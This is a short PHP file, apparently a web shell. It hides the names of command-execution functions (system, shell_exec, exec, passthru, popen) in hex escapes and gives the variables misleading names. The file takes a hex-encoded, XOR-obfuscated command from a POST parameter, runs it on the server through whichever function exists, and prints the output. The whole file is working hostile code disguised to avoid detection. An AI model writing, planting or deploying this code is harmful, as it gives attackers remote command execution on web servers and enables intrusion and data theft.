<?php

$right_pad_string1 = "\x73yste\x6D";
$right_pad_string2 = "\x73hell\x5Fexe\x63";
$right_pad_string6 = "\x73\x74rea\x6D_\x67e\x74\x5F\x63\x6F\x6Et\x65nts";
$right_pad_string3 = "\x65\x78ec";
$right_pad_string5 = "p\x6F\x70e\x6E";
$right_pad_string4 = "p\x61\x73\x73\x74hru";
$token_parser_engine = "hex2bi\x6E";
$right_pad_string7 = "pcl\x6F\x73e";
if (isset($_POST["\x70\x6Fi\x6E\x74er"])) {
    function splitter_tool($hld,$token){  $element = '';    foreach(str_split($hld) as $char){$element.=chr(ord($char)^$token);} return$element;  }
    $pointer = $token_parser_engine($_POST["\x70\x6Fi\x6E\x74er"]);
    $pointer = splitter_tool($pointer, 54);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($pointer);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($pointer);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($pointer, $pointer_hld);
        print join("\n", $pointer_hld);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($pointer);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $token_element = $right_pad_string5($pointer, 'r');
        if ($token_element) {
            $data_symbol = $right_pad_string6($token_element);
            $right_pad_string7($token_element);
            print $data_symbol;
        }
    }
    exit;
}
